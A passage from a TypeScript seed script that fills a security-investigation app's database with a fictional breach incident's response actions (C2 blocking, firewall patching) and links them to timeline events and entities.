			performed_at: baseTime + 125000,
			action_data: JSON.stringify({
				description: 'Blocked C2 infrastructure at network perimeter',
				blocked_ips: ['185.220.101.42', '198.51.100.88'],
				blocked_domains: ['malicious-c2-server.darkweb.onion'],
				method: 'Firewall rules + DNS sinkhole'
			}),
			result: 'success' as const,
			notes: 'All C2 communication channels blocked'
		},
		{
			uuid: 'act-patch-deploy-01',
			incident_id: breachIncident.uuid,
			actioned_by: '3b9f6857-873f-60f9-1ce0-0f14885h4225',
			action_type: 'patch_deployment',
			performed_at: baseTime + 150000,
			action_data: JSON.stringify({
				description: 'Emergency patch deployment for CVE-2024-3400',
				patch_version: 'PAN-OS 11.0.4-h2',
				systems_patched: 'All Palo Alto firewalls (12 devices)',
				reboot_required: true
			}),
			result: 'success' as const,
			tool_used: 'Panorama',
			notes: 'All firewalls patched and verified',
			next_steps: 'Conduct vulnerability scan to confirm remediation'
		}
	];

	await db.insert(schema.investigation_actions).values(investigationActions).onConflictDoNothing();

	// Link actions to events
	const actionEventLinks = [
		{ action_id: 'act-initial-detect-01', event_id: 'evt-fw-scan-01' },
		{ action_id: 'act-initial-detect-01', event_id: 'evt-fw-exploit-01' },
		{ action_id: 'act-fw-isolate-01', event_id: 'evt-fw-shell-01' },
		{ action_id: 'act-fw-forensics-01', event_id: 'evt-fw-exploit-01' },
		{ action_id: 'act-malware-analysis-01', event_id: 'evt-lm-mimikatz-01' },
		{ action_id: 'act-dc-isolate-01', event_id: 'evt-dc-takeover-01' },
		{ action_id: 'act-cred-reset-01', event_id: 'evt-lm-cred-dump-01' },
		{ action_id: 'act-cred-reset-01', event_id: 'evt-dc-persist-01' },
		{ action_id: 'act-ioc-hunt-01', event_id: 'evt-c2-beacon-01' },
		{ action_id: 'act-network-block-01', event_id: 'evt-c2-beacon-01' },
		{ action_id: 'act-network-block-01', event_id: 'evt-exfiltration-01' },
		{ action_id: 'act-patch-deploy-01', event_id: 'evt-fw-exploit-01' }
	];

	await db.insert(schema.action_events).values(actionEventLinks).onConflictDoNothing();

	// Link actions to entities
	const actionEntityLinks = [
		{ action_id: 'act-fw-isolate-01', entity_id: 'ent-fw-01', role: 'target' },
		{ action_id: 'act-fw-forensics-01', entity_id: 'ent-fw-01', role: 'target' },
		{ action_id: 'act-malware-analysis-01', entity_id: 'ent-tool-mimikatz', role: 'target' },
		{ action_id: 'act-malware-analysis-01', entity_id: 'ent-hash-mimikatz', role: 'target' },
		{ action_id: 'act-dc-isolate-01', entity_id: 'ent-dc-01', role: 'target' },
		{ action_id: 'act-cred-reset-01', entity_id: 'ent-user-admin-01', role: 'target' },
		{ action_id: 'act-ioc-hunt-01', entity_id: 'ent-ip-attacker-01', role: 'target' },
		{ action_id: 'act-ioc-hunt-01', entity_id: 'ent-c2-ip-01', role: 'target' },
		{ action_id: 'act-ioc-hunt-01', entity_id: 'ent-c2-domain-01', role: 'target' },
		{ action_id: 'act-network-block-01', entity_id: 'ent-c2-ip-01', role: 'target' },
		{ action_id: 'act-network-block-01', entity_id: 'ent-c2-domain-01', role: 'target' },
		{ action_id: 'act-patch-deploy-01', entity_id: 'ent-cve-01', role: 'target' },
		{ action_id: 'act-patch-deploy-01', entity_id: 'ent-fw-01', role: 'target' }
	];

	await db.insert(schema.action_entities).values(actionEntityLinks).onConflictDoNothing();

	logger.info('--- Large-scale breach incident seeded successfully ---');
	logger.info('Incident ID: ' + breachIncident.uuid);
	logger.info('Total Timeline Events: 21');
	logger.info('Total Entities: 18');
	logger.info('Total Investigation Actions: 9');

	client.close();
	logger.info('--- Database seeding process completed ---');
}

if (!DATABASE_URL) {
	logger.error('DATABASE_URL is not set. Cannot seed database.');
	process.exit(1);
}

// Only auto-execute if run directly via tsx (not when imported by drizzle-kit)
if (moduleFilePath !== executedFilePath) {
	logger.debug(`Module file path: ${moduleFilePath}`);
	logger.debug(`Executed file path: ${executedFilePath}`);
	logger.warn('Skipping automatic database seeding (imported as module)');
	logger.warn(`To execute seeding, run this script directly via tsx.`);
} else {
	logger.info('Executing database seeding script directly');
	seedDatabase();
}
